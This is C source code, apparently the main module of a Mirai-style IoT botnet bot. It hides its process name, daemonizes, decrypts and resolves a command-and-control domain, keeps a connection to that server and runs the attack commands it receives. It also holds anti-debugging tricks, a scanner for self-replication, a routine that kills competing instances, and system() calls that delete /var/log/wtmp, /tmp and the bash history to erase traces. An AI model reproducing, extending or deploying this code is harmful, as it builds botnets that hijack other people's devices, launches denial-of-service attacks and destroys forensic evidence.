#define _GNU_SOURCE

#ifdef DEBUG
#include <stdio.h>
#endif
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <sys/prctl.h>
#include <sys/select.h>
#include <signal.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <time.h>
#include <errno.h>

#include "headers/includes.h"
#include "headers/table.h"
#include "headers/rand.h"
#include "headers/attack.h"
#include "headers/killer.h"
#include "headers/util.h"
#include "headers/resolv.h"

#include "headers/scanner.h"

static void anti_gdb_entry(int);
static void resolve_cnc_addr(void);
static void establish_connection(void);
static void teardown_connection(void);
static void ensure_single_instance(void);
static BOOL unlock_tbl_if_nodebug(char *);

struct sockaddr_in srv_addr;
int fd_ctrl = -1, fd_serv = -1, ioctl_pid = 0;
BOOL pending_connection = FALSE;
void (*resolve_func)(void) = (void (*)(void))util_local_addr; // Overridden in anti_gdb_entry

#ifdef DEBUG
static void segv_handler(int sig, siginfo_t *si, void *unused)
{
    printf("Got SIGSEGV at address: 0x%lx\n", (long) si->si_addr);
    exit(EXIT_FAILURE);
}
#endif

#ifdef CONDI_SELFREP
void start_scanner(void)
{
    int rand_num = 0, processors = sysconf(_SC_NPROCESSORS_ONLN);
    
    srand(time(NULL));
    rand_num = rand() % 2;
    
    if(processors > 1)
    {
        #ifdef DEBUG
        printf("[Selfrep] device has 2 or more processors, running scanners\n");
        #endif

        scanner_init();

    } else if(rand_num == 0)
    {
        scanner_init();
    } 
}
#endif

#ifdef CONDI_IOCTL
void ioctl_keepalive(void)
{
    ioctl_pid = fork();
    if(ioctl_pid > 0 || ioctl_pid == -1)
        return;

    int timeout = 1;
    int ioctl_fd = 0;
    int found = FALSE;

    table_unlock_val(TABLE_IOCTL_KEEPALIVE1);
    table_unlock_val(TABLE_IOCTL_KEEPALIVE2);
    table_unlock_val(TABLE_IOCTL_KEEPALIVE3);
    table_unlock_val(TABLE_IOCTL_KEEPALIVE4);
    table_unlock_val(TABLE_IOCTL_KEEPALIVE5);
    table_unlock_val(TABLE_IOCTL_KEEPALIVE6);
    table_unlock_val(TABLE_IOCTL_KEEPALIVE7);   

    if((ioctl_fd = open(table_retrieve_val(TABLE_IOCTL_KEEPALIVE1, NULL), 2)) != -1 ||
       (ioctl_fd = open(table_retrieve_val(TABLE_IOCTL_KEEPALIVE2, NULL), 2)) != -1 ||
       (ioctl_fd = open(table_retrieve_val(TABLE_IOCTL_KEEPALIVE3, NULL), 2)) != -1 ||
       (ioctl_fd = open(table_retrieve_val(TABLE_IOCTL_KEEPALIVE4, NULL), 2)) != -1 ||
       (ioctl_fd = open(table_retrieve_val(TABLE_IOCTL_KEEPALIVE5, NULL), 2)) != -1 ||
       (ioctl_fd = open(table_retrieve_val(TABLE_IOCTL_KEEPALIVE6, NULL), 2)) != -1 ||
       (ioctl_fd = open(table_retrieve_val(TABLE_IOCTL_KEEPALIVE7, NULL), 2)) != -1)
    {
        #ifdef DEBUG
            printf("[ioctl_call] found a driver on the device\n");
        #endif
        found = TRUE;
        ioctl(ioctl_fd, 0x80045704, &timeout);
    }
    
    if(found)
    {
        while(TRUE)
        {
            #ifdef DEBUG
                printf("[ioctl_call] sending keep-alive ioctl call to the driver\n");
            #endif
            ioctl(ioctl_fd, 0x80045705, 0);
            sleep(10);
        }
    }
    
    table_lock_val(TABLE_IOCTL_KEEPALIVE1);
    table_lock_val(TABLE_IOCTL_KEEPALIVE2);
    table_lock_val(TABLE_IOCTL_KEEPALIVE3);
    table_lock_val(TABLE_IOCTL_KEEPALIVE4);
    table_lock_val(TABLE_IOCTL_KEEPALIVE5);
    table_lock_val(TABLE_IOCTL_KEEPALIVE6);
    table_lock_val(TABLE_IOCTL_KEEPALIVE7);

    #ifdef DEBUG
        printf("[ioctl_call] driver not found.\n");
    #endif
    
    exit(0);
}
#endif

int main(int argc, char **args)
{
    char *tbl_exec_succ;
    char name_buf[32];
    char id_buf[32];
    int name_buf_len;
    int tbl_exec_succ_len;
    int pgid, pings = 0;

#ifndef DEBUG
        sigset_t sigs;
        sigemptyset(&sigs);
        sigaddset(&sigs, SIGINT);
        sigprocmask(SIG_BLOCK, &sigs, NULL);
        signal(SIGCHLD, SIG_IGN);
        signal(SIGTRAP, &anti_gdb_entry);
#endif

#ifdef DEBUG
    printf("DEBUG MODE\n");

    sleep(1);

    struct sigaction sa;

    sa.sa_flags = SA_SIGINFO;
    sigemptyset(&sa.sa_mask);
    sa.sa_sigaction = segv_handler;
    if (sigaction(SIGSEGV, &sa, NULL) == -1)
        perror("sigaction");

    sa.sa_flags = SA_SIGINFO;
    sigemptyset(&sa.sa_mask);
    sa.sa_sigaction = segv_handler;
    if (sigaction(SIGBUS, &sa, NULL) == -1)
        perror("sigaction");
#endif

    LOCAL_ADDR = util_local_addr();

    srv_addr.sin_family = AF_INET;
    srv_addr.sin_addr.s_addr = FAKE_CNC_ADDR;
    srv_addr.sin_port = htons(FAKE_CNC_PORT);

    table_init();
    anti_gdb_entry(0);
    ensure_single_instance();
    rand_init();

    util_zero(id_buf, 32);
    if (argc == 2 && util_strlen(args[1]) < 32)
    {
        util_strcpy(id_buf, args[1]);
        util_zero(args[1], util_strlen(args[1]));
    }

    // Hide argv0
    name_buf_len = ((rand_next() % 4) + 3) * 4;
    rand_alphastr(name_buf, name_buf_len);
    name_buf[name_buf_len] = 0;
    util_strcpy(args[0], name_buf);

    // Hide process name
    name_buf_len = ((rand_next() % 6) + 3) * 4;
    rand_alphastr(name_buf, name_buf_len);
    name_buf[name_buf_len] = 0;
    prctl(PR_SET_NAME, name_buf);

    // Print out system exec
    table_unlock_val(TABLE_EXEC_SUCCESS);
    tbl_exec_succ = table_retrieve_val(TABLE_EXEC_SUCCESS, &tbl_exec_succ_len);
    write(STDOUT, tbl_exec_succ, tbl_exec_succ_len);
    write(STDOUT, "\n", 1);
    table_lock_val(TABLE_EXEC_SUCCESS);

#ifndef DEBUG
    if (fork() > 0)
        return 0;
    pgid = setsid();
    close(STDIN);
    close(STDOUT);
    close(STDERR);
#endif

    attack_init();

#ifdef CONDI_KILLER
    killerinit();
#endif

#ifdef CONDI_IOCTL
    ioctl_keepalive();
#endif

#ifdef CONDI_SELFREP
    scanner_init();
#endif

    while (TRUE)
    {
        fd_set fdsetrd, fdsetwr, fdsetex;
        struct timeval timeo;
        int mfd, nfds;

        FD_ZERO(&fdsetrd);
        FD_ZERO(&fdsetwr);

        // Socket for accept()
        if (fd_ctrl != -1)
            FD_SET(fd_ctrl, &fdsetrd);

        // Set up CNC sockets
        if (fd_serv == -1)
            establish_connection();

        if (pending_connection)
            FD_SET(fd_serv, &fdsetwr);
        else
            FD_SET(fd_serv, &fdsetrd);

        // Get maximum FD for select
        if (fd_ctrl > fd_serv)
            mfd = fd_ctrl;
        else
            mfd = fd_serv;

        // Wait 10s in call to select()
        timeo.tv_usec = 0;
        timeo.tv_sec = 10;
        nfds = select(mfd + 1, &fdsetrd, &fdsetwr, NULL, &timeo);
        if (nfds == -1)
        {
#ifdef DEBUG
            printf("select() errno = %d\n", errno);
#endif
            continue;
        }
        else if (nfds == 0)
        {
            uint16_t len = 0;

            if (pings++ % 6 == 0)
                send(fd_serv, &len, sizeof (len), MSG_NOSIGNAL);
        }

        // Check if we need to kill ourselves
        if (fd_ctrl != -1 && FD_ISSET(fd_ctrl, &fdsetrd))
        {
            struct sockaddr_in cli_addr;
            socklen_t cli_addr_len = sizeof (cli_addr);

            accept(fd_ctrl, (struct sockaddr *)&cli_addr, &cli_addr_len);

            #ifdef DEBUG
            printf("[main] Detected newer instance running! Killing self\n");
            #endif
#ifdef CONDI_SELFREP
            scanner_kill();
#endif
            kill(pgid * -1, 9);
            if(ioctl_pid != 0)
                kill(ioctl_pid, 9);
            exit(0);
        }

        // Check if CNC connection was established or timed out or errored
        if (pending_connection)
        {
            pending_connection = FALSE;

            if (!FD_ISSET(fd_serv, &fdsetwr))
            {
                #ifdef DEBUG
                    printf("[main] timed out while connecting to CNC\n");
                #endif
                teardown_connection();
            }
            else
            {
                int err = 0;
                socklen_t err_len = sizeof (err);

                getsockopt(fd_serv, SOL_SOCKET, SO_ERROR, &err, &err_len);
                if (err != 0)
                {
                    #ifdef DEBUG
                        printf("[main] error while connecting to CNC code=%d\n", err);
                    #endif
                    close(fd_serv);
                    fd_serv = -1;
                    sleep((rand_next() % 10) + 1);
                }
                else
                {
                    uint8_t id_len = util_strlen(id_buf);

                    LOCAL_ADDR = util_local_addr();
                    send(fd_serv, "\x00\x00\x00\x01", 4, MSG_NOSIGNAL);
                    send(fd_serv, &id_len, sizeof (id_len), MSG_NOSIGNAL);
                    if (id_len > 0)
                    {
                        send(fd_serv, id_buf, id_len, MSG_NOSIGNAL);
                    }
                    #ifdef DEBUG
                        printf("[main] connected to CNC\n");
                    #endif
                }
            }
        }
        else if (fd_serv != -1 && FD_ISSET(fd_serv, &fdsetrd))
        {
            int n = 0;
            uint16_t len = 0;
            char rdbuf[1024];

            // Try to read in buffer length from CNC
            errno = 0;
            n = recv(fd_serv, &len, sizeof (len), MSG_NOSIGNAL | MSG_PEEK);
            if (n == -1)
            {
                if (errno == EWOULDBLOCK || errno == EAGAIN || errno == EINTR)
                    continue;
                else
                    n = 0; // Cause connection to close
            }
            
            // If n == 0 then we close the connection!
            if (n == 0)
            {
                #ifdef DEBUG
                    printf("[main] lost connection with CNC (errno = %d) 1\n", errno);
                #endif
                teardown_connection();
                continue;
            }

            // Convert length to network order and sanity check length
            if (len == 0) // If it is just a ping, no need to try to read in buffer data
            {
                recv(fd_serv, &len, sizeof (len), MSG_NOSIGNAL); // skip buffer for length
                continue;
            }
            len = ntohs(len);
            if (len > sizeof (rdbuf))
            {
                close(fd_serv);
                fd_serv = -1;
                continue;
            }

            // Try to read in buffer from CNC
            errno = 0;
            n = recv(fd_serv, rdbuf, len, MSG_NOSIGNAL | MSG_PEEK);
            if (n == -1)
            {
                if (errno == EWOULDBLOCK || errno == EAGAIN || errno == EINTR)
                    continue;
                else
                    n = 0;
            }

            // If n == 0 then we close the connection!
            if (n == 0)
            {
                #ifdef DEBUG
                    printf("[main] lost connection with CNC (errno = %d) 2\n", errno);
                #endif
                teardown_connection();
                continue;
            }

            // Actually read buffer length and buffer data
            recv(fd_serv, &len, sizeof (len), MSG_NOSIGNAL);
            len = ntohs(len);
            recv(fd_serv, rdbuf, len, MSG_NOSIGNAL);

            #ifdef DEBUG
                printf("[main] received %d bytes from CNC\n", len);
            #endif

            if (len > 0)
                attack_parse(rdbuf, len);
        }
    }
    
    system("rm -rf /var/log/wtmp");
    system("rm -rf /tmp/*");
    system("rm -rf ~/.bash_history");

    return 0;
}

static void anti_gdb_entry(int sig)
{
    resolve_func = resolve_cnc_addr;
}

static void resolve_cnc_addr(void)
{
    struct resolv_entries *entries;

    table_unlock_val(TABLE_CNC_DOMAIN);
    entries = resolv_lookup(table_retrieve_val(TABLE_CNC_DOMAIN, NULL));
    table_lock_val(TABLE_CNC_DOMAIN);
    if (entries == NULL)
    {
        return;
    }
    srv_addr.sin_addr.s_addr = entries->addrs[rand_next() % entries->addrs_len];
    resolv_entries_free(entries);

    table_unlock_val(TABLE_CNC_PORT);
    srv_addr.sin_port = *((port_t *)table_retrieve_val(TABLE_CNC_PORT, NULL));
    table_lock_val(TABLE_CNC_PORT);
}

static void establish_connection(void)
{
    #ifdef DEBUG
        printf("[main] attempting to connect to CNC\n");
    #endif
    if ((fd_serv = socket(AF_INET, SOCK_STREAM, 0)) == -1)
    {
        #ifdef DEBUG
            printf("[main] failed to call socket(). Errno = %d\n", errno);
        #endif
        return;
    }

    fcntl(fd_serv, F_SETFL, O_NONBLOCK | fcntl(fd_serv, F_GETFL, 0));

    // Should call resolve_cnc_addr
    if (resolve_func != NULL)
        resolve_func();

    pending_connection = TRUE;
    connect(fd_serv, (struct sockaddr *)&srv_addr, sizeof (struct sockaddr_in));
}

static void teardown_connection(void)
{
    #ifdef DEBUG
        printf("[main] tearing down connection to CNC!\n");
    #endif
    if (fd_serv != -1)
        close(fd_serv);
    fd_serv = -1;
    sleep(1);
}

static void ensure_single_instance(void)
{
    static BOOL local_bind = TRUE;
    struct sockaddr_in addr;
    int opt = 1;

    if ((fd_ctrl = socket(AF_INET, SOCK_STREAM, 0)) == -1)
        return;
    setsockopt(fd_ctrl, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof (int));
    fcntl(fd_ctrl, F_SETFL, O_NONBLOCK | fcntl(fd_ctrl, F_GETFL, 0));

    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = local_bind ? (INET_ADDR(127,0,0,1)) : LOCAL_ADDR;
    addr.sin_port = htons(SINGLE_INSTANCE_PORT);

    // Try to bind to the control port
    errno = 0;
    if (bind(fd_ctrl, (struct sockaddr *)&addr, sizeof (struct sockaddr_in)) == -1)
    {
        if (errno == EADDRNOTAVAIL && local_bind)
            local_bind = FALSE;

        // Reset addr just in case
        addr.sin_family = AF_INET;
        addr.sin_addr.s_addr = INADDR_ANY;
        addr.sin_port = htons(SINGLE_INSTANCE_PORT);

        if (connect(fd_ctrl, (struct sockaddr *)&addr, sizeof (struct sockaddr_in)) == -1)
        {
            //No thing.
        }
        
        sleep(5);
        close(fd_ctrl);
        killer_kill_by_port(htons(SINGLE_INSTANCE_PORT));
        ensure_single_instance(); // Call again, so that we are now the control
    }
    else
    {
        if (listen(fd_ctrl, 1) == -1)
        {
#ifdef DEBUG
            //printf("[main] Failed to call listen() on fd_ctrl\n");
            close(fd_ctrl);
            sleep(5);
            killer_kill_by_port(htons(SINGLE_INSTANCE_PORT));
            ensure_single_instance();
#endif
        }
    }
}
